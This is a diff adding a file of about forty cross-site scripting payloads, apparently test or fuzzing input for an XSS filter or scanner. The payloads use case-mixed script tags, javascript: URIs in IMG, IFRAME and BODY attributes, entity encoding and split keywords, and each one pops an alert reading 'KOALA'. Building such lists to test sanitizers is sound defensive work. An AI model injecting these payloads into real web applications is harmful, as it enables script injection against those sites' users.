@@ -1,0 +1,40 @@
+\<script>alert("KOALA")</script>
+<script>alert("KOALA");</script>
+<ScRipT>alert("KOALA");</ScrIpT>
+<SCRIPT>alert("KOALA");</SCRIPT>
+<sCrIpT>alert("KOALA");</sCrIpT>
+"<script>alert("KOALA")</script>
+"<script>alert("KOALA");</script>
+<script>alert("KOALA")</script>
+;<script>alert("KOALA")</script>
+<? foo="><script>alert("KOALA")</script>">
+<! foo="><script>alert("KOALA")</script>">
+</ foo="><script>alert("KOALA")</script>">
+<? foo="><x foo='?><script>alert("KOALA")</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert("KOALA")</script>">
+<% foo><x foo="%><script>alert("KOALA")</script>">
+<IFRAME SRC="javascript:alert("KOALA");"></IFRAME>
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"KOALA\");&lt;/SCRIPT&gt;
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert("KOALA");\"&gt;
+&lt;BODY BACKGROUND=\"javascript&#058;alert("KOALA")\"&gt;
+&lt;BODY ONLOAD=alert("KOALA")&gt;
+&lt;IMG DYNSRC=\"javascript&#058;alert("KOALA")\"&gt;
+&lt;IMG LOWSRC=\"javascript&#058;alert("KOALA")\"&gt;
+&lt;BGSOUND SRC=\"javascript&#058;alert("KOALA");\"&gt;
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert("KOALA");\"&gt;
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert("KOALA");\"&gt;
+&lt;IMG SRC=\"jav&#x09;ascript&#058;alert("KOALA");\"&gt;
+&lt;IMG SRC=javascript&#058;alert("KOALA")&gt;
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"KOALA\")&lt;/SCRIPT&gt;\"&gt;
+&lt;IMG SRC=`javascript&#058;alert(\"KOALA\")`&gt;
+&lt;IMG SRC=javascript&#058;alert(&quot;KOALA&quot;)&gt;
+&lt;IMG SRC=JaVaScRiPt&#058;alert("KOALA")&gt;
+&lt;IMG SRC=javascript&#058;alert("KOALA")&gt;
+&lt;IMG SRC=\"javascript&#058;alert("KOALA");\"&gt;
+<IMG SRC="javascript:alert("KOALA");">
+<IMG SRC=javascript:alert("KOALA")>
+<IMG SRC=javascrscriptipt:alert("KOALA")>
+<IMG SRC=JaVaScRiPt:alert("KOALA")>
+<IMG """><SCRIPT>alert("KOALA")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert("KOALA");">
+IAMNOTAPAYLOAD-KOALA
